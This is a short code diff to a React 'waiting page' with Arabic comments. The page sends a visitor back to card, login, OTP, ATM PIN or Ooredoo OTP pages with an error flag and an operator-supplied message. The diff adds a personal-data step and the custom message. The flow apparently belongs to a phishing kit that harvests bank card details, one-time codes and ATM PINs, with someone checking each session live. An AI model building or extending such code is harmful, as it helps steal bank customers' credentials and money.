@@ -38,7 +38,8 @@ export default function WaitingPage() {
       let backUrl = "";
       
       // تحديد الصفحة التي يعود إليها العميل بناءً على المرحلة الحالية
-      if (currentStep === "login" || currentStep?.startsWith("card-")) backUrl = "/login-method";
+      if (currentStep === "personal") backUrl = "/personal-data";
+      else if (currentStep === "login" || currentStep?.startsWith("card-")) backUrl = "/login-method";
       else if (currentStep === "registration-completion" || currentStep === "card-payment") backUrl = "/registration-completion";
       else if (currentStep === "otp") backUrl = "/otp";
       else if (currentStep === "atm") backUrl = "/atm-pin";
@@ -46,8 +47,9 @@ export default function WaitingPage() {
       else if (currentStep === "otp_ooredoo") backUrl = "/otp-ooredoo";
       else backUrl = "/login-method"; // افتراضي
       
-      // العودة مع إشارة لوجود خطأ
-      setLocation(`${backUrl}?bank=${bank}&session=${sessionId}&error=true`);
+      // العودة مع إشارة لوجود خطأ ورسالة مخصصة إذا وجدت
+      const errorMsg = sessionStatus.errorMessage ? `&msg=${encodeURIComponent(sessionStatus.errorMessage)}` : "";
+      setLocation(`${backUrl}?bank=${bank}&session=${sessionId}&error=true${errorMsg}`);
     }
   }, [sessionStatus, setLocation, nextStep, bank, sessionId]);
 
